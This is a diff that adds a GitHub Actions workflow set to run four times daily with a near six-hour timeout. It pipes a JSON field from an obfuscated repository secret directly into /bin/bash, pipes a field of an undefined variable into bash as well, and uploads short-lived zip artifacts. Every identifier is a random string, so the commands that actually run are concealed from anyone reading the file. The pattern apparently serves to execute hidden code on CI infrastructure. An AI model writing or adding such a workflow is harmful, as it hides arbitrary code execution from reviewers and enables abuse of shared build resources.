@@ -1,0 +1,28 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '3 5,11,17,23 * * *'
+jobs:
+  launch:
+    runs-on: ubuntu-latest
+    timeout-minutes: 340
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Do work
+        env:
+          rzah8724: ${{ secrets.rzah8724 }}
+        run: |
+          printf '%s' "$rzah8724" | jq -r .gkgr8 | /bin/bash
+          echo $bw5715 | jq -r .zzw15441 | /bin/bash
+
+      - name: Archive data
+        uses: actions/upload-artifact@v4
+        with:
+          name: 0kgGHhuZ
+          path: "*.zip"
+          retention-days: 1
